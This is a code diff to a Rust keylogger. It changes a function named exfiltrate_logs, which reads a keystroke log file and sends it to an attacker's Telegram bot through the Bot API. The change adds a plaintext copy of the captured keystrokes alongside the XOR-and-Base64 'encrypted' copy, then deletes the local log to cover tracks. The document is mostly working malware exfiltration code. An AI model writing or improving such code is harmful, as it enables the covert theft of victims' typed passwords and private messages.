@@ -79,7 +79,6 @@ fn xor_encrypt(data: &str) -> Vec<u8> {
     data.bytes().map(|b| b ^ XOR_KEY).collect()
 }
 
-
 fn exfiltrate_logs(lock: Arc<Mutex<()>>, bot_token: &str, chat_id: &str) -> Result<(), Box<dyn std::error::Error>> {
     let _guard = lock.lock().unwrap();
     let contents = read_to_string(LOG_FILE)?;
@@ -93,13 +92,30 @@ fn exfiltrate_logs(lock: Arc<Mutex<()>>, bot_token: &str, chat_id: &str) -> Resu
     let client = Client::new();
     let telegram_url = format!("https://api.telegram.org/bot{}/sendMessage", bot_token);
 
-    let res = client
+    // Send plaintext
+    let plaintext_message = format!(" Keystroke log:\n```{}```", contents);
+    let res_plain = client
         .post(&telegram_url)
-        .form(&[("chat_id", chat_id), ("text", &encrypted_base64)])
+        .form(&[
+            ("chat_id", chat_id),
+            ("text", &plaintext_message),
+            ("parse_mode", "Markdown"),
+        ])
         .send()?;
 
-    if !res.status().is_success() {
-        eprintln!("Telegram API returned error status: {}", res.status());
+    if !res_plain.status().is_success() {
+        eprintln!("Telegram API error (plaintext): {}", res_plain.status());
+    }
+
+    // Send encrypted
+    let encrypted_message = format!("🔒 Encrypted (Base64+XOR):\n{}", encrypted_base64);
+    let res_enc = client
+        .post(&telegram_url)
+        .form(&[("chat_id", chat_id), ("text", &encrypted_message)])
+        .send()?;
+
+    if !res_enc.status().is_success() {
+        eprintln!("Telegram API error (encrypted): {}", res_enc.status());
     }
 
     remove_file(LOG_FILE)?;
